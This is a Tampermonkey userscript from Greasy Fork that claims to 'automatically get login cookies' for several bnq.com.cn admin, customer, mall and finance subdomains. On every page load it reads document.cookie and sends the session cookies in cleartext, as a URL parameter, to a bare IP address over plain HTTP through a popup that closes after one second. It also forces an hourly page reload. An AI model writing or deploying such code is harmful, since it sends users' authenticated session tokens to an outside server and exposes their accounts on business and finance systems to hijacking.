// ==UserScript==
// @name         自动获取住小橙登录Cookies
// @namespace    http://tampermonkey.net/
// @version      1.1.4
// @description  每次登录自动获取Cookies
// @license MIT
// @author       Ed Liu
// @match        https://geadmin.bnq.com.cn/*
// @match        https://geadmin.bnq.com.cn/*/*
// @match        https://geadmin.bnq.com.cn/*/*/*
// @match        https://geadmin.bnq.com.cn/*/*/*/*

// @match        https://jia.bnq.com.cn/*
// @match        https://jia.bnq.com.cn/*/*
// @match        https://jia.bnq.com.cn/*/*/*
// @match        https://jia.bnq.com.cn/*/*/*/*

// @match        https://customer.bnq.com.cn/*
// @match        https://customer.bnq.com.cn/*/*
// @match        https://customer.bnq.com.cn/*/*/*
// @match        https://customer.bnq.com.cn/*/*/*/*

// @match        https://dcmall.bnq.com.cn/*
// @match        https://dcmall.bnq.com.cn/*/*
// @match        https://dcmall.bnq.com.cn/*/*/*
// @match        https://dcmall.bnq.com.cn/*/*/*/*

// @match        https://finance.bnq.com.cn/welcome/*
// @match        https://finance.bnq.com.cn/welcome/*/*
// @match        https://finance.bnq.com.cn/welcome/*/*/*
// @match        https://finance.bnq.com.cn/welcome/*/*/*/*
// @grant        GM_download
// @downloadURL https://update.greasyfork.org/scripts/501528/%E8%87%AA%E5%8A%A8%E8%8E%B7%E5%8F%96%E4%BD%8F%E5%B0%8F%E6%A9%99%E7%99%BB%E5%BD%95Cookies.user.js
// @updateURL https://update.greasyfork.org/scripts/501528/%E8%87%AA%E5%8A%A8%E8%8E%B7%E5%8F%96%E4%BD%8F%E5%B0%8F%E6%A9%99%E7%99%BB%E5%BD%95Cookies.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // 设置刷新间隔时间，单位为毫秒（100秒 = 100 * 1000毫秒）
    const refreshInterval = 3600 * 1000;

    // 每n秒刷新一次页面,
    setInterval(function() {
        window.location.reload();
    }, refreshInterval);

    // Function to get cookies and return cookie_data
    function getZxcCookies() {
        // Get cookies
        var cookies = document.cookie;
        if (cookies) {
            console.log('Cookies:', cookies);
            var cookie_data = {cookie_info: cookies};
            // Return cookie_data
            return cookie_data;
        } else {
            alert('未正常获取到Cookies');
            return null;
        }
    }

    // Function to open a new window with the specified URL and close it after loading
    function openGetCookiesWindow() {
        const lastExecutionTime = localStorage.getItem('lastExecutionTime');
        const currentTime = new Date().getTime();
        const thirtyMinutes = 30 * 60 * 1000;

        if (lastExecutionTime && (currentTime - lastExecutionTime < thirtyMinutes)) {
            console.log('30分钟内不能再次执行');
            return;
        }

        var cookieData = getZxcCookies(); // Get the cookie_data
        if (cookieData) {
            var url = 'http://118.25.14.156:9091/zxc/save-cookies/?cookie_info=' + encodeURIComponent(cookieData.cookie_info);
            var windowFeatures = 'width=600,height=400,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no';
            var newWindow = window.open(url, '_blank', windowFeatures);

            // Close the new window after 3 seconds (adjust timing as needed)
            setTimeout(function() {
                newWindow.close();
            }, 1000); // 1000 milliseconds = 1 second

            // Update last execution time
            localStorage.setItem('lastExecutionTime', currentTime);
        } else {
            console.error('Failed to get cookies data.');
        }
    }

    // Call the function to open new window when page loads
    window.addEventListener('load', openGetCookiesWindow);




})();